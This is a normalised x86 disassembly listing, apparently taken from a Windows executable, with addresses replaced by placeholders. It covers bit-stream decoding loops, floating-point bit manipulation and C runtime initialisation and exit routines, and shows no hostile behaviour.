add eax 0xffffffff
mov [ edi + 0xcc ] eax
mov eax [ edi + 0xd0 ]
jmp r-xdata
cmp [ edi + 0xdc ] 0x0
je r-xdata
mov [ esp + 0x18 ] 0x0
lea ebp [ esi - 0x1 ]
lea esi [ ebx + ebp + 0x1 ]
mov ebx esi
lea esi [ esi + ebp + 0x1 ]
jmp r-xdata
or [ edi + 0x38 ] esi
mov esi [ esp + 0x18 ]
jmp r-xdata
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov eax [ edi + 0xc0 ]
mov [ edi + 0xcc ] esi
movzx eax [ eax ]
mov [ edi + 0xd0 ] eax
mov edx [ edi + 0xc4 ]
lea ecx [ edi + 0xb8 ]
push ecx
call edx
add esp 0x4
shr [ edi + 0xd0 ] 0x1
and eax 0x1
test eax eax
je r-xdata
test [ edi + 0x18 ] 0x200
je r-xdata
mov ecx [ esp + 0x10 ]
cmp [ ecx + 0x10 ] 0x0
je r-xdata
mov eax [ edi + 0xcc ]
test eax eax
je r-xdata
mov [ esp + 0x14 ] esi
mov eax [ esp + 0x10 ]
mov edx ebp
sub edx ebx
shr esi 0x1
cmp edx [ eax + 0x10 ]
ja r-xdata
mov eax [ ebx + 0xc ]
lea edx [ eax + 0x80 ]
shr edx 0x8
sub eax edx
mov [ ebx + 0xc ] eax
xor eax eax
mov [ edi + 0x44 ] eax
mov [ edi + 0x48 ] eax
mov [ edi + 0x4c ] eax
mov [ edi + 0x58 ] eax
mov [ edi + 0x5c ] eax
mov [ edi + 0x60 ] eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn 0x4
mov eax [ edi + 0xcc ]
test eax eax
je r-xdata
cmp ebx 0x21
je r-xdata
add ebx 0x1
cmp ebx 0x21
jl r-xdata
cmp [ esp + 0x18 ] 0x0
je r-xdata
mov ebx [ esp + 0x10 ]
mov edi [ ebx + 0xc ]
lea eax [ edi + 0x80 ]
shr eax 0x8
sub edi eax
mov eax esi
mov [ ebx + 0xc ] edi
call sub_40c730
add eax edi
mov [ ebx + 0xc ] eax
mov eax ebp
sub eax ebx
lea esi [ edi + 0xd4 ]
call sub_40c5e0
add eax ebx
cmp [ esp + 0x20 ] 0x0
je r-xdata
add [ edi + 0xc0 ] 0x2
mov eax [ edi + 0xc0 ]
cmp eax [ edi + 0xbc ]
jne r-xdata
add eax 0xffffffff
mov [ edi + 0xcc ] eax
mov eax [ edi + 0xd0 ]
jmp r-xdata
cmp ebx ebp
jge r-xdata
mov eax [ edi + 0xcc ]
test eax eax
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
add esp 0xc
retn 0x4
not esi
mov esi [ esp + 0x14 ]
cmp [ esp + 0x18 ] 0x0
je r-xdata
mov ecx [ edi + 0xc0 ]
mov [ edi + 0xcc ] 0xf
movzx eax [ ecx ]
mov [ edi + 0xd0 ] eax
mov eax [ edi + 0xc4 ]
lea edx [ edi + 0xb8 ]
push edx
call eax
add esp 0x4
shr [ edi + 0xd0 ] 0x1
and eax 0x1
test eax eax
je r-xdata
mov esi 0x1
xor ebp ebp
sub ebx esi
je r-xdata
mov ebp ebx
add ebp 0x10
jmp r-xdata
sub eax [ esp + 0x14 ]
mov ecx eax
mov ecx [ esp + 0x14 ]
sub ecx eax
jmp r-xdata
add esi esi
sub ebp 0x1
jne r-xdata
or [ edi + 0x38 ] esi
or ebp esi
add ebp 0x10
jmp r-xdata
lea ecx [ ecx ]
mov edx [ esp + 0x20 ]
mov [ edx ] ecx
add [ edi + 0xc0 ] 0x2
mov eax [ edi + 0xc0 ]
cmp eax [ edi + 0xbc ]
jne r-xdata
add eax 0xffffffff
mov [ edi + 0xcc ] eax
mov eax [ edi + 0xd0 ]
jmp r-xdata
mov eax [ edi + 0xc0 ]
mov [ edi + 0xcc ] 0xf
movzx eax [ eax ]
mov [ edi + 0xd0 ] eax
mov edx [ edi + 0xc4 ]
lea ecx [ edi + 0xb8 ]
push ecx
call edx
add esp 0x4
shr [ edi + 0xd0 ] 0x1
and eax 0x1
test eax eax
je r-xdata
add esi esi
sub ebx 0x1
jne r-xdata
or ebp esi
mov eax [ edi + 0xcc ]
test eax eax
je r-xdata
sub_40d340
sub esp 0x8
push ebx
mov ebx [ esp + 0x10 ]
test [ ebx + 0x18 ] 0x40000004
lea eax [ ebx + 0x44 ]
push esi
mov [ esp + 0xc ] eax
lea esi [ ebx + 0xb8 ]
jne r-xdata
xor eax eax
cmp [ esp + 0x1c ] eax
mov [ esp + 0x8 ] eax
jle r-xdata
mov eax [ esp + 0x1c ]
lea ecx [ eax + eax ]
mov [ esp + 0x1c ] ecx
mov edx [ esp + 0x14 ]
test [ edx + 0x18 ] 0x40000004
mov eax [ esp + 0x8 ]
pop esi
pop ebx
jne r-xdata
push edi
mov edi 0xf
push ebp
add esp 0x8
retn
cdq
sub eax edx
sar eax 0x1
mov ecx 0x2
cmp [ ebx + 0x44 ] ecx
jae r-xdata
and eax 0x1
lea edx [ eax + eax * 4 ]
lea eax [ ebx + edx * 4 + 0x44 ]
mov [ esp + 0x14 ] eax
cmp [ ebx + 0x3c ] 0x0
je r-xdata
cmp [ ebx + 0x3c ] 0x0
jne r-xdata
cmp [ esi + 0x14 ] 0x8
jge r-xdata
mov [ ebx + 0x3c ] 0x0
jmp r-xdata
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov eax [ esi + 0x18 ]
and eax 0xff
add [ esi + 0x8 ] 0x2
mov eax [ esi + 0x8 ]
cmp eax [ esi + 0x4 ]
jne r-xdata
mov edx [ esp + 0x14 ]
mov ecx [ edx ]
lea ebx [ ecx + 0x7e ]
shr ebx 0x7
mov eax ecx
add ebx ebx
xor edi edi
shr eax 0x4
sub ecx ebx
mov [ edx ] ecx
jmp r-xdata
cmp [ ebx + 0x58 ] ecx
jae r-xdata
movsx ebx [ eax + r--data ]
or eax 0xffffffff
sub eax ebx
add [ esi + 0x14 ] eax
lea ecx [ ebx + 0x1 ]
shr [ esi + 0x18 ] cl
add [ esi + 0x14 ] 0xfffffff8
shr [ esi + 0x18 ] 0x8
mov ebx 0x8
lea ecx [ ecx ]
mov eax [ esi + 0x8 ]
movzx edx [ eax ]
mov ecx [ esi + 0x14 ]
shl edx cl
or [ esi + 0x18 ] edx
mov eax [ esi + 0x18 ]
and eax 0xff
add ecx 0x10
mov [ esi + 0x14 ] ecx
jmp r-xdata
mov edx [ esi + 0xc ]
push esi
call edx
add esp 0x4
sub eax edi
call sub_40c5e0
add edi eax
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov edx ebx
and edx 0x1
mov [ eax + 0x34 ] edx
shr ebx 0x1
mov ecx ebx
and ecx 0x1
shr ebx 0x1
mov [ eax + 0x34 ] ecx
add ebx 0x1
jmp r-xdata
add [ esi + 0x8 ] 0x2
mov eax [ esi + 0x8 ]
cmp eax [ esi + 0x4 ]
jne r-xdata
add eax 0xffffffff
mov [ esi + 0x14 ] eax
mov eax [ esi + 0x18 ]
jmp r-xdata
cmp eax 0xff
jne r-xdata
add [ esi + 0x8 ] 0x2
mov eax [ esi + 0x8 ]
cmp eax [ esi + 0x4 ]
jne r-xdata
add eax 0xffffffff
mov [ esi + 0x14 ] eax
mov eax [ esi + 0x18 ]
jmp r-xdata
xor ebp ebp
add eax 0xffffffff
mov [ ebx + 0x38 ] eax
je r-xdata
mov ebp [ esp + 0x14 ]
mov ecx [ ebp ]
lea eax [ ecx + 0x80 ]
shr eax 0x7
lea edx [ ecx + eax * 4 ]
mov edi ecx
mov ecx [ ebp + 0x4 ]
add edx eax
shr edi 0x4
mov eax ecx
add edi 0x1
shr eax 0x4
cmp ebx 0x1
mov [ ebp ] edx
jne r-xdata
mov ecx [ eax + 0x34 ]
not ecx
and ecx 0x1
test ebx ebx
mov [ eax + 0x3c ] ecx
jne r-xdata
mov ecx [ esi + 0x8 ]
mov [ esi + 0x14 ] edi
movzx eax [ ecx ]
mov [ esi + 0x18 ] eax
mov eax [ esi + 0xc ]
push esi
call eax
add esp 0x4
shr [ esi + 0x18 ] 0x1
and eax 0x1
test eax eax
je r-xdata
mov ecx [ esi + 0x8 ]
mov [ esi + 0x14 ] 0xf
movzx eax [ ecx ]
mov [ esi + 0x18 ] eax
mov eax [ esi + 0xc ]
push esi
call eax
add esp 0x4
shr [ esi + 0x18 ] 0x1
and eax 0x1
test eax eax
je r-xdata
add [ esi + 0x8 ] ecx
mov eax [ esi + 0x8 ]
cmp eax [ esi + 0x4 ]
jne r-xdata
add eax 0xffffffff
mov [ esi + 0x14 ] eax
mov eax [ esi + 0x18 ]
jmp r-xdata
mov eax [ esp + 0x20 ]
mov [ eax ] 0x0
jmp r-xdata
lea edi [ edi + eax + 0x1 ]
lea eax [ ecx + 0x40 ]
shr eax 0x6
lea ecx [ ecx + eax * 4 ]
add ecx eax
cmp ebx 0x2
mov [ ebp + 0x4 ] ecx
jne r-xdata
lea edx [ ecx + 0x3e ]
shr edx 0x6
add edx edx
add eax edi
sub ecx edx
mov [ ebp + 0x4 ] ecx
jmp r-xdata
cmp ebx 0x11
je r-xdata
add ebx 0x1
cmp ebx 0x11
jb r-xdata
mov eax [ esp + 0x20 ]
mov ebx [ esp + 0x1c ]
mov [ eax ] edi
mov edi 0xf
not edi
mov edx [ esi + 0x8 ]
mov [ esi + 0x14 ] edi
movzx eax [ edx ]
mov [ esi + 0x18 ] eax
mov ecx [ esi + 0xc ]
push esi
call ecx
add esp 0x4
shr [ esi + 0x18 ] 0x1
and eax 0x1
test eax eax
je r-xdata
add eax 0x4
mov [ esp + 0x20 ] eax
mov eax [ esp + 0x10 ]
add eax 0x1
cmp eax [ esp + 0x24 ]
mov [ esp + 0x10 ] eax
jl r-xdata
mov edx [ ebp + 0x8 ]
mov eax edx
shr eax 0x4
lea ecx [ eax + 0x1 ]
add ebx 0xfffffffe
imul ecx ebx
add edi ecx
lea ecx [ edx + 0x20 ]
shr ecx 0x5
lea edx [ edx + ecx * 4 ]
add eax edi
add edx ecx
mov [ ebp + 0x8 ] edx
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + 0x1e ]
mov eax ecx
shr edx 0x5
shr eax 0x4
add edx edx
add eax edi
sub ecx edx
mov [ ebp + 0x8 ] ecx
jmp r-xdata
pop ebp
pop edi
cmp ebx 0x10
jne r-xdata
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
test [ ebx + 0x18 ] 0x40000004
jne r-xdata
cmp ebp 0x21
add ebp 0x1
cmp ebp 0x21
jge r-xdata
mov eax [ esp + 0x1c ]
cmp [ eax + 0x34 ] 0x0
je r-xdata
xor ebp ebp
mov edi 0xf
mov ebx 0x2
cmp ebp 0x2
jge r-xdata
je r-xdata
mov ecx 0x2
jmp r-xdata
add [ esi + 0x8 ] ebx
mov eax [ esi + 0x8 ]
cmp eax [ esi + 0x4 ]
jne r-xdata
add eax 0xffffffff
mov [ esi + 0x14 ] eax
mov eax [ esi + 0x18 ]
jmp r-xdata
sub ebp 0x1
mov edi 0x1
mov [ ebx + 0x38 ] 0x0
je r-xdata
mov [ ebx + 0x38 ] ebp
jmp r-xdata
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
mov eax [ esi + 0x8 ]
mov [ esi + 0x14 ] edi
movzx eax [ eax ]
mov [ esi + 0x18 ] eax
mov edx [ esi + 0xc ]
push esi
call edx
add esp 0x4
shr [ esi + 0x18 ] 0x1
and eax 0x1
test eax eax
je r-xdata
or [ ebx + 0x38 ] edi
mov edi 0xf
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
cmp [ ebx + 0x38 ] 0x0
je r-xdata
cmp ebp 0x21
je r-xdata
add ebp 0x1
cmp ebp 0x21
jl r-xdata
xor eax eax
mov [ ebx + 0x44 ] eax
mov [ ebx + 0x48 ] eax
mov [ ebx + 0x4c ] eax
mov [ ebx + 0x58 ] eax
mov [ ebx + 0x5c ] eax
mov [ ebx + 0x60 ] eax
mov eax [ esp + 0x20 ]
mov [ eax ] 0x0
jmp r-xdata
add [ esi + 0x8 ] 0x2
mov eax [ esi + 0x8 ]
cmp eax [ esi + 0x4 ]
jne r-xdata
add eax 0xffffffff
mov [ esi + 0x14 ] eax
mov eax [ esi + 0x18 ]
jmp r-xdata
cmp ebp ebx
jge r-xdata
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x8 ]
mov [ esi + 0x14 ] 0xf
movzx eax [ ecx ]
mov [ esi + 0x18 ] eax
mov eax [ esi + 0xc ]
push esi
call eax
add esp 0x4
shr [ esi + 0x18 ] 0x1
and eax 0x1
test eax eax
je r-xdata
xor ebx ebx
sub ebp 0x1
mov edi 0x1
je r-xdata
mov ebx ebp
add ebx 0x10
jmp r-xdata
add edi edi
sub ebp 0x1
jne r-xdata
or [ ebx + 0x38 ] edi
or ebx edi
add ebx 0x10
jmp r-xdata
lea ebx [ ebx ]
add [ esi + 0x8 ] 0x2
mov eax [ esi + 0x8 ]
cmp eax [ esi + 0x4 ]
jne r-xdata
add eax 0xffffffff
mov [ esi + 0x14 ] eax
mov eax [ esi + 0x18 ]
jmp r-xdata
mov edx [ esi + 0x8 ]
mov [ esi + 0x14 ] 0xf
movzx eax [ edx ]
mov [ esi + 0x18 ] eax
mov ecx [ esi + 0xc ]
push esi
call ecx
add esp 0x4
shr [ esi + 0x18 ] 0x1
and eax 0x1
test eax eax
je r-xdata
add edi edi
sub ebp 0x1
jne r-xdata
or ebx edi
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
sub_40d7f0
mov ecx [ esp + 0x8 ]
cmp [ ecx ] 0x4
mov eax [ ecx + 0x4 ]
je r-xdata
movzx edx [ eax ]
mov ecx [ esp + 0x4 ]
add eax 0x1
mov [ ecx + 0x11c ] dl
movzx edx [ eax ]
add eax 0x1
mov [ ecx + 0x11d ] dl
movzx edx [ eax ]
mov [ ecx + 0x11e ] dl
mov al [ eax + 0x1 ]
mov [ ecx + 0x11f ] al
mov eax 0x1
retn
xor eax eax
retn
sub_40d840
cmp [ esp + 0x4 ] 0x0
je r-xdata
retn
push ebp
push esi
push edi
mov edi edi
mov [ eax ] edi
add eax 0x4
cmp [ esp + 0x10 ] 0x0
jne r-xdata
mov cl [ ebx + 0x11d ]
shl esi cl
test esi esi
mov [ eax ] esi
jge r-xdata
mov esi [ eax ]
sub [ esp + 0x10 ] 0x1
movzx edx [ ebx + 0x11e ]
xor ebp ebp
xor edi edi
test esi esi
je r-xdata
pop edi
pop esi
pop ebp
mov ecx [ eax ]
cmp ecx 0x1000000
jl r-xdata
neg esi
mov [ eax ] esi
mov edi 0x80000000
test edx edx
je r-xdata
test ecx 0xf000000
je r-xdata
mov ecx [ eax ]
xor ecx edi
and ecx 0x7fffff
shl edx 0x17
xor edi ecx
xor edx edi
and edx 0x7f800000
xor edi edx
test ecx 0x800000
jne r-xdata
sar [ eax ] 0x1
add edx 0x1
test [ eax ] 0xf000000
jne r-xdata
mov edi edi
jmp r-xdata
test ebp ebp
je r-xdata
shl [ eax ] 0x1
add ebp 0x1
test [ eax ] 0x800000
je r-xdata
test [ ebx + 0x11c ] 0x1
je r-xdata
sub edx 0x1
je r-xdata
mov esi 0x1
mov ecx ebp
shl esi cl
sub esi 0x1
or [ eax ] esi
sub_40d910
push ebx
mov ebx [ esp + 0x10 ]
test ebx ebx
push esi
mov esi [ esp + 0xc ]
je r-xdata
pop esi
pop ebx
retn
push edi
mov edi [ esp + 0x14 ]
test edi edi
je r-xdata
pop edi
mov ecx [ esi ]
mov edx ecx
sar edx 0x17
sub edi 0x1
and edx 0xff
je r-xdata
mov [ esi ] 0x0
lea eax [ edx + ebx ]
test eax eax
jle r-xdata
cmp edx 0xff
je r-xdata
and ecx 0x80000000
xor ecx 0x7f800000
mov [ esi ] ecx
jmp r-xdata
cmp eax 0xff
jge r-xdata
add esi 0x4
test edi edi
jne r-xdata
shl eax 0x17
xor eax ecx
and eax 0x7f800000
xor eax ecx
mov [ esi ] eax
jmp r-xdata
sub_40d980
push ecx
push ebx
push esi
mov esi [ esp + 0x10 ]
cmp [ esi + 0xf8 ] 0x0
mov eax [ esi + 0xb0 ]
mov [ esp + 0x10 ] eax
jne r-xdata
cmp [ esp + 0x18 ] 0x0
je r-xdata
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
push ecx
mov ebx esi
call sub_40d840
add esp 0x4
pop esi
pop ebx
pop ecx
retn
mov edx [ esp + 0x10 ]
mov [ esi + 0xb0 ] edx
pop esi
pop ebx
pop ecx
retn
mov edx [ esp + 0x14 ]
push ebp
push edi
mov cl [ esi + 0x11d ]
shl eax cl
test eax eax
mov [ edx ] eax
jge r-xdata
test [ esi + 0x11c ] 0x8
je r-xdata
mov eax [ edx ]
cmp eax 0x1000000
jne r-xdata
neg eax
mov [ edx ] eax
mov ebp 0x80000000
mov eax [ esp + 0x18 ]
lea eax [ eax + eax * 2 ]
mov ecx ebp
and ecx 0x7fffff
add eax ecx
mov ecx ebp
sar ecx 0x17
and ecx 0xff
lea eax [ eax + eax * 2 ]
add eax ecx
mov ecx ebp
sar ecx 0x1f
and ecx 0x1
lea eax [ eax + eax * 2 ]
add eax ecx
mov [ edx ] ebp
add edx 0x4
cmp [ esp + 0x20 ] 0x0
mov [ esp + 0x18 ] eax
mov [ esp + 0x1c ] edx
jne r-xdata
mov eax [ esi + 0x104 ]
test eax eax
je r-xdata
test ebx ebx
je r-xdata
mov eax [ esi + 0x104 ]
test eax eax
je r-xdata
mov eax [ edx ]
sub [ esp + 0x20 ] 0x1
movzx ebx [ esi + 0x11e ]
xor edi edi
xor ebp ebp
test eax eax
jne r-xdata
pop edi
pop ebp
add [ esi + 0xf8 ] 0x2
mov eax [ esi + 0xf8 ]
cmp eax [ esi + 0xf4 ]
jne r-xdata
add eax 0xffffffff
mov [ esi + 0x104 ] eax
mov eax [ esi + 0x108 ]
jmp r-xdata
mov ecx [ edx ]
xor ecx ebp
and ecx 0x7fffff
shl ebx 0x17
xor ebp ecx
xor ebx ebp
and ebx 0x7f800000
xor ebp ebx
test eax 0x800000
jne r-xdata
add [ esi + 0xf8 ] 0x2
mov eax [ esi + 0xf8 ]
cmp eax [ esi + 0xf4 ]
jne r-xdata
add eax 0xffffffff
mov [ esi + 0x104 ] eax
mov eax [ esi + 0x108 ]
jmp r-xdata
mov ecx [ esi + 0xf8 ]
mov [ esi + 0x104 ] 0xf
movzx eax [ ecx ]
mov [ esi + 0x108 ] eax
mov eax [ esi + 0xfc ]
lea edx [ esi + 0xf0 ]
push edx
call eax
mov edx [ esp + 0x20 ]
add esp 0x4
shr [ esi + 0x108 ] 0x1
and eax 0x1
test eax eax
je r-xdata
sub ebx 0x1
je r-xdata
mov eax [ esi + 0xf8 ]
mov [ esi + 0x104 ] 0xf
movzx eax [ eax ]
mov [ esi + 0x108 ] eax
mov edx [ esi + 0xfc ]
lea ecx [ esi + 0xf0 ]
push ecx
call edx
mov edx [ esp + 0x20 ]
add esp 0x4
shr [ esi + 0x108 ] 0x1
and eax 0x1
test eax eax
je r-xdata
test [ esi + 0x11c ] 0x10
je r-xdata
cmp [ esi + 0x104 ] 0x17
jge r-xdata
test edi edi
je r-xdata
shl [ edx ] 0x1
add edi 0x1
test [ edx ] 0x800000
je r-xdata
and ebp 0x807fffff
xor ebp 0x7f800000
jmp r-xdata
cmp [ esi + 0x104 ] 0x17
jge r-xdata
mov eax [ esi + 0x104 ]
test eax eax
je r-xdata
mov eax [ esi + 0x104 ]
cmp eax 0x20
mov edx [ esi + 0x108 ]
jle r-xdata
add [ esi + 0xf8 ] 0x2
mov eax [ esi + 0xf8 ]
cmp eax [ esi + 0xf4 ]
jne r-xdata
mov al [ esi + 0x11c ]
test al 0x1
jne r-xdata
mov eax [ esi + 0x104 ]
cmp eax 0x20
mov edx [ esi + 0x108 ]
jle r-xdata
jmp r-xdata
add [ esi + 0xf8 ] 0x2
mov eax [ esi + 0xf8 ]
cmp eax [ esi + 0xf4 ]
jne r-xdata
add eax 0xffffffff
mov [ esi + 0x104 ] eax
mov eax [ esi + 0x108 ]
jmp r-xdata
add eax 0xffffffe9
shr [ esi + 0x108 ] 0x17
mov [ esi + 0x104 ] eax
mov edi [ esi + 0xf8 ]
add eax 0xffffffe9
mov [ esi + 0x104 ] eax
movzx edi [ edi ]
mov ecx 0x10
sub cl al
shr edi cl
mov [ esi + 0x108 ] edi
jmp r-xdata
mov edx [ esi + 0xf8 ]
movzx eax [ edx ]
mov ecx [ esi + 0x104 ]
shl eax cl
add ecx 0x10
mov [ esi + 0x104 ] ecx
or [ esi + 0x108 ] eax
cmp ecx 0x17
jl r-xdata
mov eax [ esi + 0xfc ]
lea edx [ esi + 0xf0 ]
push edx
call eax
add esp 0x4
mov eax 0x1
mov ecx edi
shl eax cl
sub eax 0x1
or [ edx ] eax
test al 0x2
je r-xdata
add eax 0xffffffe9
shr [ esi + 0x108 ] 0x17
mov [ esi + 0x104 ] eax
add eax 0xffffffe9
mov [ esi + 0x104 ] eax
mov ecx 0x10
sub cl al
mov eax [ esi + 0xf8 ]
movzx eax [ eax ]
shr eax cl
mov [ esi + 0x108 ] eax
jmp r-xdata
add [ esi + 0xf8 ] 0x2
mov eax [ esi + 0xf8 ]
cmp eax [ esi + 0xf4 ]
jne r-xdata
mov eax [ esi + 0xf8 ]
mov [ esi + 0x104 ] 0xf
movzx eax [ eax ]
mov [ esi + 0x108 ] eax
mov ecx [ esi + 0xfc ]
lea eax [ esi + 0xf0 ]
push eax
call ecx
mov edx [ esp + 0x20 ]
add esp 0x4
shr [ esi + 0x108 ] 0x1
and eax 0x1
test eax eax
je r-xdata
mov eax [ esi + 0x104 ]
test eax eax
je r-xdata
mov edi 0x8
cmp eax edi
jge r-xdata
and edx 0x7fffff
cmp ebx 0x19
mov ebp edx
jl r-xdata
test [ esi + 0x11c ] 0x4
je r-xdata
mov eax [ esi + 0x104 ]
test eax eax
je r-xdata
xor edx ebp
and edx 0x7fffff
xor ebp edx
mov edx [ esp + 0x1c ]
mov eax [ esi + 0xf8 ]
movzx edx [ eax ]
mov ecx [ esi + 0x104 ]
shl edx cl
add ecx 0x10
mov [ esi + 0x104 ] ecx
or [ esi + 0x108 ] edx
cmp ecx 0x17
jl r-xdata
mov edx [ esi + 0xfc ]
lea ecx [ esi + 0xf0 ]
push ecx
call edx
add esp 0x4
xor eax eax
shl eax 0x1f
mov ebp eax
jmp r-xdata
mov eax 0x1
shl eax 0x1f
mov ebp eax
jmp r-xdata
add [ esi + 0xf8 ] 0x2
mov eax [ esi + 0xf8 ]
cmp eax [ esi + 0xf4 ]
jne r-xdata
add eax 0xffffffff
mov [ esi + 0x104 ] eax
mov eax [ esi + 0x108 ]
jmp r-xdata
mov ecx [ esi + 0x104 ]
cmp ecx 0x20
mov eax [ esi + 0x108 ]
jle r-xdata
lea esp [ esp ]
cmp edi [ esi + 0x104 ]
jle r-xdata
add [ esi + 0xf8 ] 0x2
mov eax [ esi + 0xf8 ]
cmp eax [ esi + 0xf4 ]
jne r-xdata
add eax 0xffffffff
mov [ esi + 0x104 ] eax
mov eax [ esi + 0x108 ]
jmp r-xdata
mov edx [ esi + 0xf8 ]
mov [ esi + 0x104 ] 0xf
movzx eax [ edx ]
mov [ esi + 0x108 ] eax
mov ecx [ esi + 0xfc ]
lea eax [ esi + 0xf0 ]
push eax
call ecx
add esp 0x4
shr [ esi + 0x108 ] 0x1
and eax 0x1
test eax eax
je r-xdata
add ecx 0xfffffff8
shr [ esi + 0x108 ] 0x8
mov [ esi + 0x104 ] ecx
lea edx [ ecx - 0x8 ]
mov [ esi + 0x104 ] edx
mov ecx 0x10
sub cl dl
mov edx [ esi + 0xf8 ]
movzx edx [ edx ]
shr edx cl
mov [ esi + 0x108 ] edx
jmp r-xdata
mov eax [ esi + 0xf8 ]
movzx edx [ eax ]
mov ecx [ esi + 0x104 ]
shl edx cl
add ecx 0x10
mov [ esi + 0x104 ] ecx
or [ esi + 0x108 ] edx
cmp ecx edi
jl r-xdata
mov edx [ esi + 0xfc ]
lea ecx [ esi + 0xf0 ]
push ecx
call edx
add esp 0x4
mov eax [ esi + 0x104 ]
cmp eax 0x20
mov edx [ esi + 0x108 ]
jle r-xdata
add [ esi + 0xf8 ] 0x2
mov eax [ esi + 0xf8 ]
cmp eax [ esi + 0xf4 ]
jne r-xdata
mov eax [ esi + 0xf8 ]
mov [ esi + 0x104 ] 0xf
movzx eax [ eax ]
mov [ esi + 0x108 ] eax
mov edx [ esi + 0xfc ]
lea ecx [ esi + 0xf0 ]
push ecx
call edx
mov edx [ esp + 0x20 ]
add esp 0x4
shr [ esi + 0x108 ] 0x1
and eax 0x1
test eax eax
jne r-xdata
mov edx [ esp + 0x1c ]
xor eax eax
shl eax 0x1f
xor eax ebp
and eax 0x80000000
xor ebp eax
jmp r-xdata
mov edx [ esp + 0x1c ]
mov eax 0x1
shl eax 0x1f
xor eax ebp
and eax 0x80000000
xor ebp eax
jmp r-xdata
shl eax 0x17
xor eax ebp
and eax 0x7f800000
xor ebp eax
add [ esi + 0xf8 ] 0x2
mov eax [ esi + 0xf8 ]
cmp eax [ esi + 0xf4 ]
jne r-xdata
sub eax edi
mov ecx edi
shr [ esi + 0x108 ] cl
mov [ esi + 0x104 ] eax
sub eax edi
mov [ esi + 0x104 ] eax
mov ecx 0x10
sub cl al
mov eax [ esi + 0xf8 ]
movzx eax [ eax ]
shr eax cl
mov [ esi + 0x108 ] eax
jmp r-xdata
mov eax [ esi + 0xf8 ]
movzx edx [ eax ]
mov ecx [ esi + 0x104 ]
shl edx cl
add ecx 0x10
mov [ esi + 0x104 ] ecx
or [ esi + 0x108 ] edx
cmp edi ecx
jg r-xdata
mov edx [ esi + 0xfc ]
lea ecx [ esi + 0xf0 ]
push ecx
call edx
add esp 0x4
mov ecx edi
mov eax 0x1
shl eax cl
sub eax 0x1
and eax edx
mov ecx eax
mov eax [ esp + 0x1c ]
or [ eax ] ecx
mov edx eax
jmp r-xdata
sub_40e020
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
mov edi edi
add edx 0x1
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_40e0e9
push esi
mov esi [ esp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ esp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_40e109
mov ecx [ esp + 0x4 ]
push esi
xor esi esi
cmp ecx esi
jne r-xdata
mov eax [ rw-data ]
cmp eax esi
je r-xdata
call sub_412089
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_41202a
add esp 0x14
push 0x16
pop eax
pop esi
retn
mov [ ecx ] eax
xor eax eax
pop esi
retn
sub_40e140
mov eax [ esp + 0x4 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
cmp [ rw-data ] esi
je r-xdata
call sub_412089
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_41202a
add esp 0x14
push 0x16
pop eax
pop esi
retn
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
pop esi
retn
sub_40e17c
cmp [ r--data ] 0x0
je r-xdata
call sub_41223f
push r--data
push r--data
call sub_40e0e9
test eax eax
pop ecx
pop ecx
jne r-xdata
push r--data
call sub_4122d2
test eax eax
pop ecx
je r-xdata
retn
push esi
push edi
push sub_41221b
call sub_4121e5
mov esi r--data
mov eax esi
mov edi r--data
cmp eax edi
pop ecx
jae r-xdata
push [ esp + 0x4 ]
call [ r--data ]
pop ecx
cmp [ rw-data ] 0x0
pop edi
pop esi
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
xor eax eax
push rw-data
call sub_4122d2
test eax eax
pop ecx
je r-xdata
add esi 0x4
cmp esi edi
jb r-xdata
call eax
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_40e20e
push 0xc
push r--data
call sub_412340
push 0x8
call sub_411ef3
pop ecx
and [ ebp - 0x4 ] 0x0
xor esi esi
inc esi
cmp [ rw-data ] esi
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40e2c7
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] esi
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_412385
retn
mov [ rw-data ] esi
push 0x8
call sub_411e1b
pop ecx
push [ ebp + 0x8 ]
call sub_40e0aa
push r--data
mov eax r--data
call sub_40e0d1
pop ecx
push [ rw-data ]
call sub_4116dd
mov edi eax
push [ rw-data ]
call sub_4116dd
pop ecx
pop ecx
mov [ ebp - 0x1c ] eax
test edi edi
je r-xdata
push r--data
mov eax r--data
call sub_40e0d1
pop ecx
sub [ ebp - 0x1c ] 0x4
cmp [ ebp - 0x1c ] edi
jb r-xdata
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
test eax eax
je r-xdata
call eax
jmp r-xdata
sub_40e31c
push esi
call sub_4116d4
mov esi eax
push esi
call sub_4129ed
push esi
call sub_41290e
push esi
call sub_411f24
push esi
call sub_412904
push esi
call sub_4128fa
push esi
call sub_4126f0
push esi
call sub_412580
push esi
call sub_41256f
push sub_40e2ed
call sub_411671
add esp 0x24
mov [ rw-data ] eax
pop esi
retn
sub_40e368
push 0xc
push r--data
call sub_412340
